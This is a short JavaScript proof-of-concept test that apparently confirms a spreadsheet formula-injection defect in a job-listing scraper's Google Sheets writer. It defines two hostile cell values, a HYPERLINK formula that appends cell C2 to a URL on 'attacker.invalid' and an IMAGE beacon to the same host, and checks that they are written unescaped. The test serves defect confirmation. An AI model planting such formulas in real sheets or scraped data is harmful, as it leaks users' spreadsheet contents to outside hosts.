// Trust boundary: scraped listing text reaches the user's Sheet as USER_ENTERED
// with no leading =,+,-,@ escaping, so Sheets evaluates it as a formula.
import { createPipelineWriter } from "../../integrations/browser-use-discovery/src/sheets/pipeline-writer.ts";
import { createFakeSheets, HEADER, lead, runtimeConfig } from "./fake-sheets.mjs";

const evilTitle = '=HYPERLINK("https://attacker.invalid/?leak="&C2,"Senior Engineer")';
const evilCompany = "=IMAGE(\"https://attacker.invalid/px.gif\")";
import { toPlainText } from "../../integrations/browser-use-discovery/src/browser/selectors/shared.ts";
// normalizeLeadWithDiagnostics cleans title/company with toPlainText (lead-normalizer.ts:123-124).
const normalized = { title: toPlainText(evilTitle), company: toPlainText(evilCompany) };
console.log("toPlainText keeps leading '=':", JSON.stringify(normalized.title.slice(0, 12)), JSON.stringify(normalized.company.slice(0, 8)));
const sheet = createFakeSheets({ Pipeline: [HEADER] });
const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl });
await w.write("probe-sheet", [lead({ url: "https://boards.greenhouse.io/evil/jobs/9", title: normalized?.title || evilTitle, company: normalized?.company || evilCompany })]);
const app = sheet.calls.find((c) => c.kind === "values.append");
const body = JSON.parse(app.body);
console.log("append valueInputOption: USER_ENTERED (query param set at pipeline-writer.ts:603)");
console.log("cells B,C sent:", JSON.stringify(body.values[0].slice(1, 3)));
console.log(/^=/.test(body.values[0][1]) ? "DEFECT CONFIRMED: formula text written unescaped with USER_ENTERED" : "escaped");
